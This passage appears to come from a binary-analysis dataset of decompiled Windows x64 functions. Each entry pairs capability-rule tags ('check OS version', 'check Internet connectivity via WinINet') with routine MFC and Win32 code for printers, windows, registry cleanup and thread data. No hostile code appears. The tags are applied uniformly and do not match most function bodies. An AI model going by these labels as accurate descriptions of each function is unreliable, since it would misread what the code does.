        "decompiled_code": "\nvoid fcn.1400113cc(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int64_t arg1_00;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uchar *arg3_00;\n    uchar auStack392 [32];\n    int32_t aiStack360 [2];\n    int64_t iStack352;\n    uchar auStack344 [259];\n    uchar uStack85;\n    uint64_t uStack72;\n    \n    uStack72 = *0x14003e1a0 ^ auStack392;\n    fcn.140011258(0);\n    arg1_00 = fcn.1400112c0(0, &iStack352);\n    if (arg1_00 != iStack352) {\n        (*_sym.imp.USER32.dll_EnableWindow)(arg1_00, 1);\n    }\n    iVar3 = 0;\n    aiStack360[0] = 0;\n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg1_00, aiStack360);\n    if ((((arg1_00 == 0) || (iVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)(),  aiStack360[0] != iVar1)) ||\n        (piVar2 = (*_sym.imp.USER32.dll_SendMessageA)(arg1_00, 0x376, 0),  piVar2 == NULL)) &&\n       (piVar2 = NULL,  arg1 != 0)) {\n        piVar2 = arg1 + 0xf0;\n    }\n    if ((piVar2 != NULL) && (iVar3 = *piVar2,  arg4 != 0)) {\n        *piVar2 = arg4 + 0x30000;\n    }\n    if ((arg3 & 0xf0) == 0) {\n        if ((arg3 & 0xf) < 2) {\n            arg3._0_4_ = arg3 | 0x30;\n        }\n        else if ((arg3 & 0xf) - 3 < 2) {\n            arg3._0_4_ = arg3 | 0x20;\n        }\n    }\n    auStack344[0] = 0;\n    if (arg1 == 0) {\n        arg3_00 = auStack344;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack344, 0x104);\n        if (iVar1 == 0x104) {\n            uStack85 = 0;\n        }\n    }\n    else {\n        arg3_00 = *(arg1 + 0xa0);\n    }\n    fcn.140009704(arg1_00, arg2, arg3_00, arg3);\n    if (piVar2 != NULL) {\n        *piVar2 = iVar3;\n    }\n    if (iStack352 != 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(iStack352, 1);\n    }\n    fcn.140011258(1);\n    fcn.14001b410(uStack72 ^ auStack392);\n    return;\n}\n",
        "token_count": 696
    },
    "14001169": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong * fcn.140011694(ulong *arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    \n    arg1[1] = 0;\n    *arg1 = arg2;\n    if (*0x140053370 == '\\0') {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"KERNEL32\");\n        if (iVar2 == 0) {\n            fcn.140005e30();\n            pcVar1 = swi(3);\n            puVar3 = (*pcVar1)();\n            return puVar3;\n        }\n        *0x140053350 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"CreateActCtxA\");\n        *0x140053358 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"ReleaseActCtx\");\n        *0x140053360 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"ActivateActCtx\");\n        *0x140053368 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"DeactivateActCtx\");\n        if (*0x140053350 == 0) {\n            if (((*0x140053358 != 0) || (*0x140053360 != 0)) || (*0x140053368 != 0)) {\n                fcn.140005e30();\n                pcVar1 = swi(3);\n                puVar3 = (*pcVar1)();\n                return puVar3;\n            }\n        }\n        else if (((*0x140053358 == 0) || (*0x140053360 == 0)) || (*0x140053368 == 0)) {\n            fcn.140005e30();\n            pcVar1 = swi(3);\n            puVar3 = (*pcVar1)();\n            return puVar3;\n        }\n        *0x140053370 = '\\x01';\n    }\n    return arg1;\n}\n",
        "token_count": 432
    },
    "1400118f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400118f4(int64_t arg1)\n\n{\n    if (*(arg1 + 0x110) != 0) {\n        (**(**(arg1 + 0x110) + 0x28))();\n    }\n    if (*(arg1 + 0x124) != 0) {\n        fcn.14001484c(arg1, \"Settings\", \"PreviewPages\", *(arg1 + 0x124));\n    }\n    return;\n}\n",
        "token_count": 103
    },
    "140011b3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.140011b38(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    ulong uStackX8;\n    \n    if (*(arg1 + 0xe8) != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GlobalLock)();\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*(iVar2 + 2) + iVar2, arg2);\n        if (iVar1 == 0) {\n            iVar1 = sub.WINSPOOL.DRV_OpenPrinterA(arg2, &uStackX8, 0);\n            if (iVar1 != 0) {\n                if (*(arg1 + 0xe0) != 0) {\n                    fcn.140016620(*(arg1 + 0xe0));\n                }\n                iVar1 = sub.WINSPOOL.DRV_DocumentPropertiesA(0, uStackX8, arg2, 0, 0, 0);\n                uVar3 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x42, iVar1);\n                *(arg1 + 0xe0) = uVar3;\n                uVar3 = (*_sym.imp.KERNEL32.dll_GlobalLock)(uVar3);\n                iVar1 = sub.WINSPOOL.DRV_DocumentPropertiesA(0, uStackX8, arg2, uVar3, 0, 2);\n                if (iVar1 != 1) {\n                    fcn.140016620(*(arg1 + 0xe0));\n                    *(arg1 + 0xe0) = 0;\n                }\n                sub.WINSPOOL.DRV_ClosePrinter(uStackX8);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 381
    },
    "140011e6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140011e68(int64_t *arg1)\n\n{\n    if ((*0x140053358 != NULL) && (*arg1 != -1)) {\n        if ((*0x140053368 != NULL) && (arg1[1] != 0)) {\n            arg1[1] = 0;\n            (**0x140053368)(0);\n        }\n        (**0x140053358)(*arg1);\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "14001279": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong fcn.140012794(ulong noname_0, ulong *arg2)\n\n{\n    ulong uVar1;\n    \n    if (*(arg2 + 1) == 1) {\n        uVar1 = 0xffffffffffffffff;\n    }\n    else {\n        if (*(arg2 + 1) == 0xf) {\n            (*_sym.imp.USER32.dll_ValidateRect)(*arg2, 0);\n        }\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 109
    },
    "1400129a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.1400129a8(int64_t *arg1, int64_t arg2)\n\n{\n    code **ppcVar1;\n    int64_t iVar2;\n    code *arg1_00;\n    \n    ppcVar1 = (**(*arg1 + 0x50))();\n    do {\n        if (*ppcVar1 == NULL) {\n            return 0;\n        }\n        arg1_00 = ppcVar1[1];\n        if (*(arg2 + 8) < 0xc000) {\n            iVar2 = fcn.140008ddc(arg1_00, *(arg2 + 8), 0, 0);\n            if (iVar2 != 0) {\ncode_r0x0001400129ee:\n                (**(iVar2 + 0x18))(arg1, *(arg2 + 0x10), *(arg2 + 0x18));\n                return 1;\n            }\n        }\n        else {\n            while (iVar2 = fcn.140008ddc(arg1_00, 0xc000, 0, 0),  iVar2 != 0) {\n                if (**(iVar2 + 0x10) == *(arg2 + 8)) goto code_r0x0001400129ee;\n                arg1_00 = iVar2 + 0x20;\n            }\n        }\n        ppcVar1 = (**ppcVar1)();\n    } while( true );\n}\n",
        "token_count": 313
    },
    "140012a5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140012a58(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    ulong uVar4;\n    int64_t *piVar5;\n    \n    iVar2 = fcn.140006c98();\n    if (((*(iVar2 + 8) == 0) || (*arg1 != 0)) || (iVar1 = fcn.1400129a8(*(iVar2 + 8), arg1),  iVar1 == 0)) {\n        iVar2 = fcn.140006c98();\n        if (*(iVar2 + 8) == NULL) {\n            piVar3 = NULL;\n        }\n        else {\n            piVar3 = (**(**(iVar2 + 8) + 0xe8))();\n        }\n        if (piVar3 == NULL) {\n            iVar2 = 0;\n        }\n        else {\n            iVar2 = piVar3[8];\n        }\n        iVar1 = fcn.14000b870(iVar2, arg1);\n        if (iVar1 == 0) {\n            if (piVar3 != NULL) {\n                uVar4 = fcn.14000b398(*arg1);\n                piVar5 = fcn.14000cd40(uVar4);\n                if (piVar5 != piVar3) {\n                    uVar4 = (**(*piVar3 + 0x210))(piVar3, arg1);\n                    return uVar4;\n                }\n            }\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 345
    },
    "140012f5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140012f50(void)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    uint uVar3;\n    \n    iVar1 = fcn.140006c48();\n    if (*(iVar1 + 0x28) == '\\0') {\n        iVar1 = fcn.140006414();\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        uVar2 = (*_sym.imp.USER32.dll_SetWindowsHookExA)(0xffffffff, 0x140012d18, 0, uVar3);\n        *(iVar1 + 0x50) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 145
    },
    "14001312": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140013128(int64_t arg1)\n\n{\n    ulong uVar1;\n    \n    if (*(arg1 + 0xb0) == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = (**(**(arg1 + 0xb0) + 0x20))();\n    }\n    return uVar1;\n}\n",
        "token_count": 83
    },
    "14001322": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.140013220(int64_t arg1, int64_t *arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    ulong arg2_00;\n    uchar auStack392 [32];\n    int64_t aiStack360 [2];\n    ulong uStack344;\n    int64_t iStack336;\n    int64_t iStack328;\n    int64_t iStack320;\n    ulong uStack312;\n    uchar auStack296 [272];\n    uint64_t uStack24;\n    \n    uStack312 = 0xfffffffffffffffe;\n    uStack24 = *0x14003e1a0 ^ auStack392;\n    iStack336 = arg1;\n    aiStack360[0] = fcn.140002100(*arg2 + -0x18);\n    aiStack360[0] = aiStack360[0] + 0x18;\n    if ((arg1 == -0x80000000) && (iVar3 = fcn.1400061e4(),  iVar3 == 1)) {\n        arg2_00 = fcn.14001314c(&iStack320, \"Software\\\\Classes\\\\\", aiStack360);\n        fcn.140002480(aiStack360, arg2_00);\n        LOCK();\n        piVar1 = iStack320 + -8;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar3 + -1 < 1) {\n            (**(**(iStack320 + -0x18) + 8))();\n        }\n        arg1 = -0x7fffffff;\n        iStack336 = -0x7fffffff;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(arg1, aiStack360[0], &uStack344);\n    if (iVar3 == 0) {\n        do {\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RegEnumKeyA)(uStack344, 0, auStack296, 0x104);\n            if (iVar3 != 0) break;\n            fcn.140004200(&iStack328, auStack296);\n            iVar3 = fcn.140013220(uStack344, &iStack328);\n            LOCK();\n            piVar1 = iStack328 + -8;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            if (iVar2 + -1 < 1) {\n                (**(**(iStack328 + -0x18) + 8))();\n            }\n        } while (iVar3 == 0);\n        if ((iVar3 == 0x103) || (iVar3 == 0x3f2)) {\n            (*_sym.imp.ADVAPI32.dll_RegDeleteKeyA)(arg1, aiStack360[0]);\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(uStack344);\n    }\n    LOCK();\n    piVar1 = aiStack360[0] + -8;\n    iVar3 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar3 + -1 < 1) {\n        (**(**(aiStack360[0] + -0x18) + 8))();\n    }\n    fcn.14001b410(uStack24 ^ auStack392);\n    return;\n}\n",
        "token_count": 750
    },
    "140013dc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140013dc4(void)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    ulong uVar4;\n    uchar auStack24 [24];\n    \n    iVar2 = fcn.140006c48();\n    if (*(iVar2 + 8) == 0) {\n        uVar4 = 0;\n    }\n    else {\n        piVar3 = fcn.14001276c();\n        if (piVar3 == NULL) {\n            piVar3 = NULL;\n        }\n        else {\n            piVar3 = (**(*piVar3 + 0xe8))(piVar3);\n        }\n        if ((piVar3 != NULL) && (iVar1 = (**(*piVar3 + 0x18))(piVar3, 0xe146, 0, 0, auStack24),  iVar1 != 0)) {\n            return 1;\n        }\n        iVar2 = fcn.140006c48();\n        uVar4 = (**(**(iVar2 + 8) + 0x18))(*(iVar2 + 8), 0xe146, 0, 0, auStack24);\n    }\n    return uVar4;\n}\n",
        "token_count": 268
    },
    "14001427": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.14001427c(int64_t *arg1)\n\n{\n    bool bVar1;\n    bool bVar2;\n    bool bVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    int64_t *piVar10;\n    int64_t *hWnd;\n    ulong arg3;\n    uint32_t uVar11;\n    ulong uStack104;\n    \n    iVar8 = arg1[0x18];\n    iVar7 = arg1[0x17];\n    iVar6 = fcn.140006c48();\n    uStack104 = *(iVar6 + 0x18);\n    if (arg1[0x16] != 0) {\n        iVar7 = fcn.140006c48();\n        uStack104 = *(iVar7 + 0x18);\n        (*_sym.imp.KERNEL32.dll_FindResourceA)(uStack104, arg1[0x16], 5);\n        iVar7 = (*_sym.imp.KERNEL32.dll_LoadResource)(uStack104);\n    }\n    if (iVar7 != 0) {\n        iVar8 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar7);\n    }\n    if (iVar8 == 0) {\n        iVar8 = -1;\n    }\n    else {\n        iVar6 = fcn.140013c18(arg1);\n        fcn.14000b4b4();\n        hWnd = NULL;\n        bVar3 = false;\n        bVar1 = false;\n        bVar2 = false;\n        if (((iVar6 != 0) &&\n            (iVar9 = (*_sym.imp.USER32.dll_GetDesktopWindow)(),  bVar1 = bVar3,  bVar2 = false,  iVar6 != iVar9)) &&\n           (iVar4 = (*_sym.imp.USER32.dll_IsWindowEnabled)(iVar6),  iVar4 != 0)) {\n            (*_sym.imp.USER32.dll_EnableWindow)(iVar6);\n            bVar2 = true;\n            piVar10 = fcn.14001276c();\n            if (piVar10 != NULL) {\n                hWnd = (**(*piVar10 + 0xe8))(piVar10);\n            }\n            if (((hWnd != NULL) && (iVar4 = (**(*hWnd + 0x250))(hWnd),  iVar4 != 0)) &&\n               (iVar4 = fcn.140007c44(hWnd),  iVar4 != 0)) {\n                fcn.140007c74(hWnd, 0);\n                bVar1 = bVar2;\n            }\n        }\n        fcn.14000d690(arg1);\n        arg3 = fcn.14000b398(iVar6);\n        iVar4 = fcn.140014010(arg1, iVar8, arg3, uStack104);\n        if (iVar4 != 0) {\n            if ((*(arg1 + 0xf) & 0x10) != 0) {\n                uVar5 = fcn.140007b34(arg1);\n                uVar11 = 4;\n                if ((uVar5 >> 8 & 1) != 0) {\n                    uVar11 = 5;\n                }\n                fcn.14000ade4(arg1, uVar11);\n            }\n            if (arg1[8] != 0) {\n                fcn.140007d10(arg1, 0, 0, 0);\n            }\n        }\n        if (bVar1) {\n            fcn.140007c74(hWnd, 1);\n        }\n        if (bVar2) {\n            (*_sym.imp.USER32.dll_EnableWindow)(iVar6, 1);\n        }\n        if ((iVar6 != 0) && (iVar8 = (*_sym.imp.USER32.dll_GetActiveWindow)(),  iVar8 == arg1[8])) {\n            (*_sym.imp.USER32.dll_SetActiveWindow)(iVar6);\n        }\n        (**(*arg1 + 0xc0))(arg1);\n        fcn.140013c74(arg1);\n        if (arg1[0x16] != 0) {\n            (*_sym.imp.KERNEL32.dll_FreeResource)(iVar7);\n        }\n        iVar8 = *(arg1 + 0x11);\n    }\n    return iVar8;\n}\n",
        "token_count": 949
    },
    "140014a2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140014a20(int64_t arg1)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    \n    if (arg1 == 0) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        uVar2 = (*pcVar1)();\n        return uVar2;\n    }\n    if (*(arg1 + 0x10) == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = (**(arg1 + 0x10))();\n    }\n    return uVar2;\n}\n",
        "token_count": 131
    },
    "140014b3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * fcn.140014b38(int64_t *arg1, int32_t *arg2)\n\n{\n    int32_t *piVar1;\n    int64_t **ppiVar2;\n    int64_t *piVar3;\n    int32_t **ppiVar4;\n    \n    piVar1 = (**(*arg1 + 0x88))();\n    if (piVar1 == NULL) {\n        ppiVar2 = (**(*arg1 + 0x70))();\n        if ((((*0x140034c98 == *arg2) && (arg2[1] == *0x140034c9c)) && (arg2[2] == *0x140034ca0)) &&\n           (arg2[3] == *0x140034ca4)) {\n            do {\n                for (piVar3 = ppiVar2[1]; *piVar3 != 0; piVar3 = piVar3 + 2) {\n                    if (*(piVar3[1] + arg1) != 0) {\n                        return piVar3[1] + arg1;\n                    }\n                }\n                ppiVar2 = *ppiVar2;\n            } while (ppiVar2 != NULL);\n        }\n        else {\n            do {\n                for (ppiVar4 = ppiVar2[1]; piVar1 = *ppiVar4,  piVar1 != NULL; ppiVar4 = ppiVar4 + 2) {\n                    if (((*piVar1 == *arg2) && (piVar1[1] == arg2[1])) &&\n                       ((piVar1[2] == arg2[2] && ((piVar1[3] == arg2[3] && (*(ppiVar4[1] + arg1) != 0)))))) {\n                        return ppiVar4[1] + arg1;\n                    }\n                }\n                ppiVar2 = *ppiVar2;\n            } while (ppiVar2 != NULL);\n        }\n        piVar1 = NULL;\n    }\n    return piVar1;\n}\n",
        "token_count": 446
    },
    "140014c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.140014c0c(int64_t *arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    int32_t iVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    int64_t iStackX8;\n    \n    piVar3 = (**(*arg1 + 0x70))();\n    do {\n        for (piVar4 = piVar3[1]; *piVar4 != 0; piVar4 = piVar4 + 2) {\n        }\n        for (piVar4 = piVar4 + 1; *piVar4 != -1; piVar4 = piVar4 + 2) {\n            puVar1 = *(arg1 + *piVar4);\n            if (puVar1 != NULL) {\n                iStackX8 = 0;\n                iVar2 = (***puVar1)(puVar1, arg2, &iStackX8);\n                if ((iVar2 == 0) && (iStackX8 != 0)) {\n                    return iStackX8;\n                }\n            }\n        }\n        piVar3 = *piVar3;\n        if (piVar3 == NULL) {\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 277
    },
    "140014c9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.140014c9c(int64_t pvarg)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    \n    if (*(pvarg + 0x10) == 0) {\n        LOCK();\n        piVar1 = pvarg + 8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + 1;\n        uVar3 = iVar2 + 1;\n    }\n    else {\n        uVar3 = (**(**(pvarg + 0x10) + 8))();\n    }\n    return uVar3;\n}\n",
        "token_count": 143
    },
    "140014cc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.140014cc4(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    ulong in_R8;\n    ulong in_R9;\n    ulong uVar3;\n    ulong uStack32;\n    int32_t iStack24;\n    \n    uVar3 = 0xfffffffffffffffe;\n    if (*(arg1 + 1) == 0) {\n        iVar2 = 0;\n    }\n    else {\n        LOCK();\n        piVar1 = arg1 + 1;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        iVar2 = iVar2 + -1;\n        if (iVar2 == 0) {\n            fcn.140006cc4(&uStack32, arg1[7]);\n            (**(*arg1 + 0x20))(arg1);\n            if (iStack24 != 0) {\n                fcn.140006000(0, uStack32, in_R8, in_R9, uVar3);\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 243
    },
    "140014d2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140014d2c(int64_t arg1)\n\n{\n    if (*(arg1 + 0x10) == 0) {\n        fcn.140014cc4(arg1);\n    }\n    else {\n        (**(**(arg1 + 0x10) + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 74
    },
    "140014da": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140014da8(int64_t arg1)\n\n{\n    ulong in_RDX;\n    ulong in_R8;\n    \n    if (*(arg1 + 0x10) == 0) {\n        fcn.140014d50(arg1, in_RDX, in_R8);\n    }\n    else {\n        (****(arg1 + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "1400153e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400153ec(uint *lpCriticalSection, ulong arg2, int64_t arg3)\n\n{\n    code **ppcVar1;\n    code *pcVar2;\n    ulong in_R9;\n    ulong uVar3;\n    \n    uVar3 = 0xfffffffffffffffe;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection + 10);\n    if ((arg2 < 1) || (lpCriticalSection[3] <= arg2)) {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 10);\n        return;\n    }\n    ppcVar1 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*lpCriticalSection);\n    if (ppcVar1 == NULL) {\n        ppcVar1 = fcn.140014f70(0x20);\n        if (ppcVar1 == NULL) {\n            ppcVar1 = NULL;\n        }\n        else {\n            *ppcVar1 = vtable.CThreadData.0;\n        }\n        *(ppcVar1 + 2) = 0;\n        ppcVar1[3] = NULL;\n        *(ppcVar1 + *(lpCriticalSection + 8)) = *(lpCriticalSection + 6);\n        *(lpCriticalSection + 6) = ppcVar1;\n    }\n    else if ((arg2 < *(ppcVar1 + 2)) || (arg3 == 0)) goto code_r0x000140015539;\n    if (ppcVar1[3] == NULL) {\n        if (0xffffffff < lpCriticalSection[3] << 3) {\n            fcn.140001010(0x80070057);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        pcVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0);\n    }\n    else {\n        if (0xffffffff < lpCriticalSection[3] << 3) {\n            fcn.140001010(0x80070057);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        pcVar2 = (*_sym.imp.KERNEL32.dll_LocalReAlloc)\n                           (ppcVar1[3], lpCriticalSection[3] << 3 & 0xffffffff, 2, in_R9, uVar3);\n    }\n    if (pcVar2 == NULL) {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 10);\n        fcn.140005de8();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    ppcVar1[3] = pcVar2;\n    fcn.14001bd50(pcVar2 + *(ppcVar1 + 2) * 8, 0, lpCriticalSection[3] - *(ppcVar1 + 2) << 3);\n    *(ppcVar1 + 2) = lpCriticalSection[3];\n    (*_sym.imp.KERNEL32.dll_TlsSetValue)(*lpCriticalSection, ppcVar1);\ncode_r0x000140015539:\n    if ((ppcVar1[3] != NULL) && (arg2 < *(ppcVar1 + 2))) {\n        *(ppcVar1[3] + arg2 * 8) = arg3;\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 10);\n    return;\n}\n",
        "token_count": 744
    },
    "14001559": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
